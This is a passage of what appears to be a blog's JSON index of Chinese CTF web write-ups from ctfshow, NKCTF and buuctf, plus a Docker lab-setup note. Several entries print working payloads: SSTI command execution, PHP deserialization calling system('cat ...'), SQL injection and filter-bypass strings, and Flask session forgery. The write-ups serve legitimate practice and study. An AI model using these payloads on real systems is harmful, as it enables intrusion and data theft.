小尾巴这次打完省赛（校赛bushi）虽然很水，但是成功爬进了学校的实验室，也算是一段时间的努力总算有了成果吧，进了实验室才是刚刚开始，自身还是有很多不足，需要继续努力，继续奋斗，干巴得！"},{"title":"CTF-SHOW 2023愚人杯 WEB部分WP","date":"2023-04-05T08:56:20.000Z","url":"/post/186d5605.html","tags":["php原生类","flask session伪造","ssti"],"categories":["ctfshow"],"content":"CTF-SHOW 2023愚人杯 WEB部分WP Challenge_1 easy_signin这道题像是buuctf一个题目的套皮，查看源码和url，图片内容是以base64编码输出的，并且请求文件名称也是通过base64编码，直接查看index.php的内容，先编码一下index.php payload：?img=aW5kZXgucGhw 拿到base64加密后的内容 再去解密一下，拿到flag Challenge_2 被遗忘的反序列化这道题目没做出来，一开始就卡住了，他提示当前目录有个txt文件，那么就应该先去读这个文件获取相应的提示，不会啊，看了wp，发现用了php原生类读的，真的太强了 然后这道题预期解真的太麻烦了，还要涉及密码偏移问题，而且还要脚本爆破，非预期真的很简单 直接来看这里： $a = new $this-&gt;coos($this-&gt;file); 这一行 看到这里我们是不是可以构造一个可变函数 形如：$a($b)的形式达到getshell的操作 但是这里有个new 将类实例化 也就意为着不能通过这样来构造可变函数 那么这里就用到了php的原生类，具体看这篇文章： 可遍历目录的原生类： DirectoryIterator 类FilesystemIterator 类 GlobIterator 类 使用 DirectoryIterator 类DirectoryIterator配合glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 比如以这样的/f*形式模糊操作来获得flag的文件名 比如我win电脑上d盘根目录下存在一个blog文件,我就可以利用原生类再配合glob协议获取到该文件的具体文件名 回到题目：本地构造 然后这里传参是通过请求包中AAAAAA来传参的蛮新颖的 然后再通过读文件原生类来读flag SplFileObject 本地构造： Challenge_3 easy_ssti这道题还是蛮简单的 根据题目是一个模板注入的题目 查看源码 下载一个压缩包 一眼顶针，flask的模板注入 然后网上payoad太多了（） 这里主要过滤了斜杠，可以用$&#123;HOME:0:1&#125;绕过 payload: &#123;&#123;get_flashed_messages.__globals__['os'].popen('whoami').read()&#125;&#125; &#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat $&#123;HOME:0:1&#125;[e-g]lag').read()&#125;&#125; challenge_4 easy_flask这道题目快做出来了，最后一步没有去读取当前目录下的app.py的文件去看源码，真给自己无语住了，脑子被大便灌了一样 回到题目： 看标题还是关于flask模板的漏洞 申请一个账号进去 最后一句话他说只会给admin给一些东西，那么目标就很明确了，flask模板常见的session伪造，找一个脚本伪造就行了 之后给到一个假的flag 然后注意到他请求方式 他现在给的源代码只是一部分，我们应该通过读app.py来获取完整的源代码 注意到这里 可以进行命令执行 注意是python的命令执行和php的形式稍有不同 稍微解释一下 还是不太熟悉python的命令执行 是通过调用模块的方式 import() 函数用于动态加载类和函数 os — 操作系统接口模块 os.popen() 方法用于从一个命令打开一个管道。 read() 方法用于从文件读取指定的字节数，如果未给定或为负则读取所有。 Challenge_5 easy_php源码： 这道题不会做，看了wp还是蛮神奇的，简单分析一下 应该是通过反序列化去执行ctfshow类中的system()函数 这里首先解除一下我固有的想法，我们都知道，当反序列化时首先会执行__wakeup魔术方法，这道题执行后会用到die()函数，程序运行完了，我原以为要通过增加对象属性方法去绕过__wakeup函数，但是发现没必要，因为析构函数不会受到影响。 所以没必要去绕过 那么这道题目最主要的就是去绕过这个正则匹配 我们传参不能以O或者a开头 我们都知道序列化后的字符串首字母就为O 意为object对象的意思 那么这里应该怎么绕过呢 这里考到了 PHP7.3 __wakeup绕过，ArrayObject内置类 并且这个类可以起到类似于反序列化我们传入的序列化对象，当然这里说的不严谨，但可以这样理解参考： 注意这里只能在php7.3版本下才能成功，一开始复现的时候没注意到 c打头 那么问题来了，为什么要ban a字符呢ban了o字符不久行了嘛 如果不ban a 我们可以直接序列化数组去包含我们的恶意代码从而达到getshell 明白之后，本地构造 这里传参的时候记得把1+1&gt;2 url编码一下 之后就是读取了。 后记：这次最主要学到了php原生类的知识点把，tql！！！！"},{"title":"记一次简单的docker开设web靶场","date":"2023-03-31T07:13:38.000Z","url":"/post/5400d97d.html","tags":["搭建","docker"],"categories":["搭建"],"content":"记录一次简单的docker开设web靶场 前期准备：一台云服务器(这里用到了舍友的服务器&#x3D;&#x3D;) docker环境 正文：首先自我认识什么是docker，docker就像是一个装水的杯子，在这里把里面的水叫做镜像，我们需要先下载好镜像，当运行镜像时，docker会先在本地寻找所要打开的镜像，如果找不到就会自动从docker镜像仓库下载。 这里我已经提前配置好了docker环境 上网一搜有很多安装教程 docker version查看版本信息 docker search lamp 查找lamp堆栈镜像 LAMP 堆栈是开发人员用来构建网站和 Web 应用程序的四种不同软件技术的捆绑包。 LAMP 是操作系统 Linux、Web 服务器 Apache、数据库服务器 MySQL 和编程语言 PHP 的首字母缩写 docker pull tutum/lamp 下载tutum&#x2F;lamp版本的 docker iamges 下载好之后查看本地镜像 将镜像实例化 需要分配服务器的端口 这里要在服务器管理页面给开放一个端口（比如阿里云或者腾讯云的控制台） docker run -d -p 9999:80 tutum/lamp 这里我分配的是9999端口 docker ps查看当前运行的容器，看到了我们刚刚启动的容器 docker ps -a是查看所有的容器，包括当前不运行的 这里注意一下，区分镜像和容器的区别，一个镜像可以开很多个容器，用容器id来区分相同镜像实例化产生不同的容器，这里还是要注意记录一下自己在用的容器id，以免误删了，整个容器中的你已经弄好的文件都会被删除。 docker exec -it 1c0d6146aa65 bash 进入我们刚刚实例化好的容器里面 exit退出当前所在的容器 接下来就是在&#x2F;var&#x2F;www&#x2F;html文件下的index.php下提交web题目的源码，然后在根目录下创建flag的文件，一个简单的web靶场复现环境就创建好了，接下来就可以愉快的复现题目了！ 这里我放了一个测试php代码和根目录下的flag文件： 还有就是这个lamp开的容器内是没有vim编辑环境的，如果直接想在容器内写代码的话，可以在容器内安装vim编辑器。 浏览器访问：124.221.177.174:9999 成功一个简单的web靶场就搭建好了！ 如果想关闭容器，注意这里不是删除镜像文件，只是关闭这个镜像实例化的一个容器。 docker stop 容器id关闭容器 docker start 容器id打开容器 docker rm 容器id 删除容器 结尾：这里步骤截图放的图片暴露了服务器的外网ip和一些其他信息，大佬不要渗透我啊，这里只是一个热爱ctf的小菜鸡的一次记录罢了，在线求饶QWQ"},{"title":"NKCTF 2023 WEB WP","date":"2023-03-28T04:55:23.000Z","url":"/post/8bc42760.html","tags":["RCE奇淫方式","PHP反序列化","linux通配符","getshell","md5 sha1强相等"],"categories":["各赛事WP"],"content":"NKCTF 2023 部分WEB WP 前言这次第一次组队，与舍友一位pwn选手(攻克三道)，打还是蛮不错的一次体验，虽然排名没有多靠前吧，坐牢两天终于啃下两道web题目，听说其他都是1day，还是大佬的比赛啊，我这种菜狗就啃啃签到题目，但收获还是很多啊。 最后只攻克了三道，也写写wp吧，也算是给自己记录一下。 baby_php放出源码： 一道经典的反序列化pop链rce题目，就是我卡在最后怎么绕waf很久，我太菜了。 pop链构造很简单，主要说说waf的绕过把 waf分别禁了f l a g 字符这就导致很多linux命令都不能用了 比如ls cat tac less tail 然后还禁了通配符? 和*防止我们通过这样模糊操作去getshell ls 可以通过 dir来绕过 读文件用more来绕过 然后读flag就是很头疼的事情了，这里就是因为他禁了通配符给了我启发 参考： 还有一种通配符是[]可以匹配指定范围中的任意字符 那么 f和g就可以用[e-h]来绕过 a是字母表第一个，该怎么绕过呢，我们可以构造[非数字]形式:[^0-9] 这里尖括号就是排除匹配范围，这也就可以包含所有字母 来达到获取a的效果了 本地构造： 记得最后payload url编码一下 反序列化题目的常用套路了 拿到flag esay_php放出源码： 这是一道md5弱相等，sha1碰撞，php字符串解析特性这里是考php命名规则合法与否，还有就是无数字字母rce。 sha1碰撞来看sha1碰撞： 之前有做过md5强相等的题目，因为被string强转化了，所以一些常见的数组绕过就不能用了，只能老实用脚本碰撞，sha1和md5做法很相似。 sha1 — 计算字符串的 sha1 散列值 在这里先说一说md5强类型字符串转换后碰撞相等吧 这里有专门md5碰撞的脚本： 本地测试 先拿到散列值： 本地写一个测试demo 源码： 这里测试最好在低版本php下测试不然高版本已经被修复了 我这里version是5.3.29 测试是可以通过脚本碰撞 再来看sha1() 这里没有找到关于sha1的碰撞脚本，但是找到了两个符合条件的值，之后再遇到拿来用就行。 a&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 b&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 php命名规则一开始做的时候以为这道题出问题了，最后发现这里有坑。 先来看本地测试，如果我们直接给NS_CTF.go传值，传入后会是什么呢？ 可见当我们传入的点号被改为了下划线，这里是因为点号在php内是非法命名符，会被转化为下划线 官方文档中有提到： 那么该怎么绕过呢 这里参考： 构造payload: NS[CTF.go=1就能绕过 这里会把第一个[先转化为下划线然后第二个点就不会被转化了 这里我认为是php解析时把第一个[当作了数组的标志但不合法就给转化了 然后以为点是数组里的元素名从而没有转化为下划线 这个bug只有当php版本小于8时才会有：参考： php8版本修复了这个bug，如图 无数字字母rce这里用到了异或绕过，直接脚本生成，真的很方便 放大佬的理解： 总结的非常好透彻，我就不在这里多言了qwq 放一下构造脚本把： "},{"title":"buuctf 38-[GXYCTF2019]禁止套娃","date":"2023-02-27T05:08:13.000Z","url":"/post/2ed7a105.html","tags":["源码泄露","GitHack","(?R)","嵌套构造","PHPSESSION"],"content":"buuctf 38-[GXYCTF2019]禁止套娃 开局一张图，buu网站扫网站有时候出不来，看了别人的wp是git源码泄露了 参考大佬的文章： 可以拿config文件测试一下 构造payload： • config：文件包含项目特有的配置选项，git config命令会改动它； 发现有文件下载下来 说明是github源码泄露 下好脚本 构造payload：python2 GitHack.py  注意末尾加上 .git 查看index.php 主要是过滤了一些伪协议和一些“et”“na”“info”“dec”“bin”“hex”“oct”“pi”“log”字符 最重要的是中间一层 有我不知道的正则表达式的知识点 参考： 这里(?R)代表当前表达式 ,就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c(d()))) 注意这里加号不是把前后连接起来 +：加号在正则表达式有特殊含义，等同于匹配前面的子表达式一次或多次 当;等于后面匹配完以后剩余的;条件成立 可以根据这个思路构造命令执行 方法一：localeconv() 函数返回一包含本地数字及货币格式信息的数组。 (PHP 4, PHP 5, PHP 7, PHP 8) 返回一个数组 第一个元素为. 构造payload的时候可以用的 . 和 ./ 意思相同都是当前目录 ../是上级目录 current() — 返回数组中的当前值 说明: current(array|object $array): mixed 每个数组中都有一个内部的指针指向它“当前的”单元，初始化时会指向该数组中的第一个值。 构造?exp=print_r(scandir(current(localeconv()))); 所以这个组合scandir(current(localeconv()))很常用，可以记一下。 发现flag文件，接下来就是怎么读了，因为现在指针指在第一个元素上 把数组反转过来让flag文件在正数第二 再通过next()指向第二个元素读取flag array_reverse() — 返回单元顺序相反的数组 next() — 将数组中的内部指针向前移动一位 show_source — 别名 highlight_file() 用哪个都行 构造payload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 方法二：通过修改phpsession即会话状态 然后payload读出来即可 参考还是上面的文章  session_id()可以用来获取&#x2F;设置当前会话 ID,可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的。 但session_id必须要开启session才可以使用，所以我们要先使用session_start。 构造payload:?exp=show_source(session_id(session_start())); bp抓包修改session_id=flag.php "},{"title":"buuctf 37-[网鼎杯 2020 朱雀组]phpweb","date":"2023-02-27T05:04:27.000Z","url":"/post/6d6051d0.html","tags":["文件包含","反序列化","代码审计"],"categories":["buuctf"],"content":"buuctf [网鼎杯 2020 朱雀组]phpweb 发现可以直接获取我们的时间，并且每五分钟刷新更新一次，大致意思就是利用系统时区设置，最重要的是应该是这个网页通过php 里的data()函数来获取当前我们的时间，并且在网页源代码中也标出来了，应该算是提示。 并且发现 通过post方式 给$func传值为 data $p 传值为Y-m-d h:i:s a data()函数格式化时间用的 所以就可以 用system() 函数命令执行了 但是肯定不行 被河蟹了 发现随便输入时 会爆出call_user_func()函数 这个函数简单来说就是用第一个输入值作为回调函数 第二个输入为第一个回调函数的参数 直接使用file_get_contents() 本来想直接爆出flag文件的内容 但是命名被改为别的形式了 呢就爆一下index.php看一下黑名单 看到类就想到反序列化漏洞 将类中的属性值改为我们可以恶意操作的值 然后给$func传反序列化函数，给p传我们的序列化结果。 思路就是直接反序列化将原本post值修改 不通过黑名单筛选 本地构造： 构造payload：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 发现并没有flag文件 所以只能通过find指令寻找了 这里省略 我这里find找不出来没有回响 环境有问题 最后构造payload：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; "},{"title":"buuctf 35-[BJDCTF2020]The mystery of ip","date":"2023-02-27T04:53:24.000Z","url":"/post/a4341e77.html","tags":["模板注入","xff","smarty模板"],"categories":["buuctf"],"content":"buuctf [BJDCTF2020]The mystery of ip 这道题考到了模板注入简单记录一些吧 参考： 服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题. 获取到了我们的ip，第一时间就想到了修改xff 但是没啥用 思路大概是就是利用xff 进行恶意读取吧 看了wp 是php的smarty模板注入 参考： 代码直接运行了 于是直接进行命令执行就行 直接读根目录flag文件就行了"},{"title":"buuctf 34-[RoarCTF 2019]Easy Java","date":"2023-02-26T15:34:24.000Z","url":"/post/d05894c4.html","tags":["弱口令","java"],"categories":["buuctf"],"content":"buuctf 34-[RoarCTF 2019]Easy Java 弱口令能爆出来： 账号:admin 密码: admin888 但是没啥用 还是所以只剩下登录页面的帮助了 这里考到了java 的 WEB-INF 知识点 参考： 但是这里通过get方式传参是不行的 只能通过post 构造 payload： filename=WEB-INF/web.xml WEB-INF&#x2F;web.xml ： Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 可以找到flag的位置以及命名方式 找到了flag的地址 以及他的命名文件 秉持java 万物都是类的原则 要读取flag 就要读这个flag类 WEB-INF&#x2F;classes&#x2F; 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中） 构造payload ：filename=WEB-INF/classes/com/wm/ctf/FlagController.class不要忘了class后缀 一开始就忘了 解码 得到flag！"},{"title":"buuctf 33-[网鼎杯 2018]Fakebook","date":"2023-02-19T12:43:59.000Z","url":"/post/c6fe9d66.html","tags":["sql注入","robots.txt","反序列化","curl","ssrf"],"categories":["buuctf"],"content":"buuctf [网鼎杯 2018]Fakebook 日常访问robots.txt文件 robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。 发现有个文件可以打开 附上源码： 是一个php写的类 然后用了curl curl: 然后发现有 $output = curl_exec($ch) 可以将类中blog重新构造用来执行ssrf漏洞  直接看大佬的总结 申请一个账号进入可以看到存在sql注入 判断是什么类型注入 no=1 and 1=1# 可以 no=1 and 1=2# 不行 说明这是数字注入 ?no=0 order by 4# 四列 报错注入(这里比较推荐报错 联合查询的话一开始找不到回显点 可能是我眼瞎) 其实是过滤了 union select 用union/**/select 绕过就行 1 and updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),3)# 注意~ 不能用十六进制的 0x7e 这里有检测 用回原型好就行 [*] query error! (XPATH syntax error: ‘fakebook‘) 联合注入 fakebook users no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users# 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:1;s:4:”blog”;s:11:”"},{"title":"buuctf 32-[CISCN2019 华北赛区 Day2 Web1]Hack World","date":"2023-02-19T12:39:47.000Z","url":"/post/3b320c12.html","tags":["sql注入","脚本"],"categories":["buuctf"],"content":"buuctf CISCN2019 华北赛区 Day2 Web1]Hack World 这道题是一道比较经典的布尔盲注的题目，也就全当作是学习了。 题目表示flag在flag表里的flag字段里 这点就很可疑 输入 1，2都有正确的回显 输入1&#39;时显示 显示布尔（错误），这里就可以判断是布尔注入了 好好学习一下布尔盲注的知识： 这里有篇布尔盲注的的文章： 可以学习学习 substr(string,开始1，长度)函数 用于截取字符串的部分字符串 asscii() 用于将字符转化成ascii编码 这里本地搭了一个环节测试 在题目测试一下 发现被过滤了 fuzz一下哪些被过滤了 发现一些常用的 空格 or union 都被过滤了 /**/绕过空格也被过滤了 所以只能用()来绕过 构造payload： 正常回显了 这里再用到mysql 的if语句 if(条件，成功回显，失败回显) 本地测试 这是为什么条件等于84 是因为 我本地flag的第一个字母为T ascii编码为84 构造payload：if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0) 成功回显 至于为什么是102 因为flag开头f 的ascii编码为102 那么就可以借助脚本，这里因为我python没怎么学，脚本不会写 但是整体脚本思路为 当匹配字符ascii 与题目相同时回显1 否则回显0 脚本根据题目回显的语句进行判断 然后遍历整个32-126 ascii编码字符 这里放一下大佬的脚本： 以后有时间要滚去学习写写脚本了qwq "},{"title":"buuctf 31-[GYCTF2020]Blacklist","date":"2023-02-17T15:12:07.000Z","url":"/post/a8bde72c.html","tags":["sql注入","堆叠注入","handler用法"],"categories":["buuctf"],"content":"buuctf [GYCTF2020]Blacklist 这道题又是一道学习的题目，打开看到界面ui很像一道堆叠注入的题目，刚好这道题也是用堆叠注入 查字段：1&#39; order by 3# error 1054 : Unknown column &#39;3&#39; in &#39;order clause&#39; 只有两列 这道题过滤了 不能用预编译 select 报错注入应该是 “supersqli” “FlagHere” 直接用1&#39;;desc FlagHere#也可以 string(4) “flag” desc用法： 1.查表的详细信息 eg：desc table_name; 2.desc降序排列数据 eg: select select ename,sal from emp order by sal desc; 手动指定按照薪水由大到小排序（降序关键字desc） 然后这里用到了 mysql handler语句查询字段内的信息 这条语句使我们能够一行一行的浏览一个表中的数据 下面在本地搭了一个环境进行测试 如下： 之后就可以构造payload： 成功 "},{"title":"buuctf 29-[GXYCTF2019]BabySQli","date":"2023-02-17T13:50:32.000Z","url":"/post/b32b8b53.html","tags":["sql注入","联合查询特性","base32"],"categories":["buuctf"],"content":"buuctf [GXYCTF2019]BabySQli 抓包发现一串密文： MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 这是一串base32编码，base32编码特征是只有大写字母和数字 解密后：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 这是一串base64编码，base64编码特点是有大小写字母和数字而且末尾常常是等于号 解码 得到：select * from user where username = &#39;$name&#39; 意思是让我们从登录名进行注入 这个题目过滤了蛮多常用查询字符，可以bp抓包 fuzz一下 显示419就是被河蟹的 415就是正常回显 过滤了 常用的or``（） 然后可以大写绕过 构造1&#39; Order by 4# 发现报错只有三列 这里再提供一种select查询爆字段的方法 select 1,2# 报错 select 1,2,3# 正常回显也可以用来判断字段数 然后就不会了 看了其他大佬的wp 这里利用了一个mysql联合查询的特性： union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中 具体可以看这篇大佬的详细wp： 由于只能通过admin账户,因此让虚拟用户的名字是admin 同时密码转换成了md5存储(猜测应该是为了保护用户的隐私,md5不可逆,这就让即使身为管理员也不能知道用户密码)于是在构造的时候要注意数据库密码应该是md5模式的.同时登入时输入对应的明文密码即可。 构造：name=123&#39;union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1 其中 md5值为1的md5值，这里就是构造了 当后台检测1 = md（1）时为真 成功登录 其实就是 后台去查找符合密码为1的md5值 但是本来没有 我们利用联合查询特性构造了一个无中生有 于是能成功登录"},{"title":"buuctf 25-[极客大挑战 2019]HardSQL","date":"2023-02-17T13:46:26.000Z","url":"/post/58b11103.html","tags":["sql注入","报错注入","空格绕过"],"categories":["buuctf"],"content":"buuctf [极客大挑战 2019]HardSQ 这个题目是报错注入的典型，值得记录一下 简单尝试之后常见的字符比如空格 union都被黑名单了 尝试用&#x2F;**&#x2F;绕过空格但还是不行，只能用（）来绕过空格 这里测试空格是否被河蟹 不能通过1’加空格 这样测试是不对的 最好是用1&#39; #这样测试比较正确，因为一般题目不会河蟹#字符 空格绕过的原理： 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格 so 所以只能用报错注入了，这里就好好回顾一下报错注入 一般报错注入分为两个函数：updatexml() 与extractvalue() 就拿updatexml举例 他们两的差别就只是传参上 updatexml(1，2，3)函数总共有三个参数，当第二个参数有特殊符号时，就会触发数据库报错，而且将参数2的内容显示在报错信息中，常用是~他的十六进制用0x7e表示 然后，报错注入常用拼接函数 concat和group_concat concat和group_concat都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。 所以格式一般为：updatexml(1,concat(0x7e,sql语句,0x7e),1) 然而，extractvalue(1，2)只有两个参数，当第二个参数具有特殊符号时，则会报错。 格式为：extractvalue( 1,concat(0x7e,sql语句)) 回到题目： 其实题目本身就是考察报错注入与绕过空格 这里就简单谢谢payload： XPATH syntax error: ‘geek‘ XPATH syntax error: ‘H4rDsq1‘ XPATH syntax error: ‘id,username,password‘ XPATH syntax error: ‘~1flagflag{9804c176-72e3-46d2-90’ 这里flag显示的不完全，用到left 和 right函数 XPATH syntax error: ‘~04c176-72e3-46d2-902b-0e79f4ea1’ 查询到其余的flag 因为还河蟹了&#x3D; 所以用了like语句 完成！"},{"title":"buuctf 22-admin","date":"2023-02-17T13:34:46.000Z","url":"/post/b64980cf.html","tags":["flask框架","弱口令","unicode特殊字符"],"categories":["buuctf"],"content":"buuctf admin 这到题目有一个非预期，弱口令直接爆出来了，直接账号为admin，密码为123就能拿到flag，我还想这题怎么这么简单，看了别人的题解才发现又是一道学习的题目。 预期解： 先申请一个账号，抓包看到： 那么这道题的思路就是让我去登录管理员的账号就能拿到flag了，但是不知道密码 学习别人的wp： 在源码中发现一个github链接： 打开是一个flask项目，Flask是一个用Python编写的Web应用程序框架 比较重要的文件就是： user.sql这是一个建数据库的文件 run.py 就是启动这个程序 把端口开放在互联网中 app文件中 routes.py 对应路由 非常重要 flask中就是一个一个路由组成的 查看源码： 预期解一：unicode特殊字符绕过 代码审计 看到上面注册，登录，修改系统均有一个转小写的操作strlower(),并且这个转小写的函数不是python自带的，是自己封装的，那么这是非常不正常的。 这里通过调用nodeprep模块，nodeprep.prepare这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A 在代码开头有一行代码：from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，说明nodeprep是从twisted模块中导入的，利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。而值得注意的是strlower()自定义函数被调用了三次，分别是register、login、change，即注册、登陆、修改密码时都会被调用。 思路：用ᴬdmin注册，后台代码就会调用一次nodeprep.prepare函数，把用户名转换成Admin；修改一次密码，再次调用nodeprep.prepare函数，使用户名由Admin转换为admin，重新登陆，就可以得到flag。 预期解二：抓包发现session flask session伪造 先了解一下session：简单说就是保持会话登录，识别用户 但是一般session是存储在服务器的，但是flask存储在客户端，他是对称加密解密，所以可以进行解码然后伪造编码上传。 在config.py拿到密钥ckj123 待会进行加密解密的时候用 从网上下载一个session 解密加密的脚本 构造payload： 得到： 将我们创建的abc改为admin 然后再加密 bp抓包修改 构造payload： 得到： 更换session，成功 "},{"title":"buuctf 21-[BJDCTF2020]Easy MD5","date":"2023-02-17T13:27:27.000Z","url":"/post/eef45ee2.html","tags":["md5绕过","ffifdyop特殊字符串"],"categories":["buuctf"],"content":"buuctf [BJDCTF2020]Easy MD5 思路：看到url上又password字样，又有输入栏，随便传入admin然后抓包试试，发现提示。 显示select * from &#39;admin&#39; where password=md5($pass,true) 分析：通过sql语句，从admin表里查数据，当password&#x3D;md（）函数加密后的pass时就可查询。 考点： sql语句注入 md5（）函数：本来应该返回32 位的十六进制数形式散列值，但是此题可选的 binary 被设置为 true，那么 md5 摘要将以 16 位的原始二进制格式返回。 看到作业提示md5在sql注入中常见的搭档是字符串ffifdyop，然后去谷歌，csdn看看这是什么东西。 ffifdyop 经过md5加密后：276f722736c95d99e921722cf9ed621c 再转换为字符串：’or’6&lt;乱码&gt; 即 ‘or’66�]��!r,��b 原理：md5（）函数先把 **ffifdyop**加密为**276f722736c95d99e921722cf9ed621c**Mysql 又会把 hex （十六进制）转成 ascii 解释 在or的两边要有单引号，使它变成 password&#x3D;‘xxx’or‘xxx’ 的形式 因此拼接之后的形式是select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’ 为一个永真式 输入得到代码： 分析：通过get传参a，b，使得题目md5值弱相等 。 方法： 数组绕过 md5（）值碰撞，有一些特殊的数值在md5（）加密后会形成0e开头的字符串，从而达到弱相等 md5（）碰撞原理： 选择任何方法都行，之后得到： 同理，不过之后是强类型相等，估计这一关是考察数组绕过吧，之后得到flag "},{"title":"buuctf 20-[护网杯 2018]easy_tornado","date":"2023-02-07T14:22:01.000Z","url":"/post/98e6259a.html","tags":["render渲染","python","环境变量"],"categories":["buuctf"],"content":"buuctf 20-[护网杯 2018]easy_tornado 这是一道毫无头绪的题目，就当作学习了。 进入之后有三个页面内容分别为： flag in &#x2F;fllllllllllllag render md5(cookie_secret+md5(filename)) 发现请求过程很奇怪 通过filename请求一个文件然后filehash请求一个哈西值 也就是加密了一下 如果不请求哈希值试一下 直接报错，并且注意：/error?msg=Error直接来看大佬的wp render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。 Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量. 然后通过环境变量去获取cookie_secret 构造payload ：/error?msg=&#123;&#123;handler.settings&#125;&#125; 得到：&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;76a26309-3853-4c68-b91e-eee75246e722&#39;&#125; 发现了cookie_secret 之后将/fllllllllllllag加密一下将cookie_secret 加上 再进行一次md5加密就可以获得flag了 构造payload：?filename=/fllllllllllllag&amp;filehash=99d14d071426405f00eca73ec4a5eb64 成功！"},{"title":"buuctf 18-[RoarCTF 2019]Easy Calc","date":"2023-02-07T12:41:55.000Z","url":"/post/318fd29a.html","tags":["文件包含","php字符串解析特性"],"categories":["buuctf"],"content":"buuctf 18-[RoarCTF 2019]Easy Calc 抓包发现提交方式为： 给&#x2F;cal.php 以get方式提交一个$num变量 发现黑名单过滤 发现好多读文件的空格，斜杠都被黑名单了。 csdn有一篇总结的很好，拉过来 知识点： chr() 函数：从指定的 ASCII 值返回字符。 ASCII 